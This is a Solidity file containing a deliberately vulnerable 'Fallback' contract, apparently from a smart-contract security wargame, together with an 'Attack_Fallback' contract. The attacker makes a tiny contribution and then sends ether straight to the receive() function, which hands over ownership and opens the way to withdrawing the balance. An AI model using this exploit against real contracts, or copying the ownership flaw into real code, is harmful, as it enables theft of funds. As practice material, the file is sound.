// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {

    mapping(address => uint) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

    function contribute() public payable {
        require(msg.value > 0, "Fallback: not enough ether");
        require(msg.value < 0.001 ether, "Fallback: too much");
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}

contract Attack_Fallback {
    address public target;

    function set_target(address addr) public {
        target = addr;
    }

    function deposit() public payable {
        require(msg.value > 0, "depositnot enough ether");
        Fallback(payable(target)).contribute{value : msg.value}();
        //        (bool success, bytes memory data) = payable(target).call{value:1000000}(abi.encodeWithSignature("contribute()"));

    }


    function atk() public payable {
        require(msg.value > 0, "not enough ether");
        (bool sent,) = target.call{value : msg.value}("");
        require(sent, "Failed to send Ether");

    }

}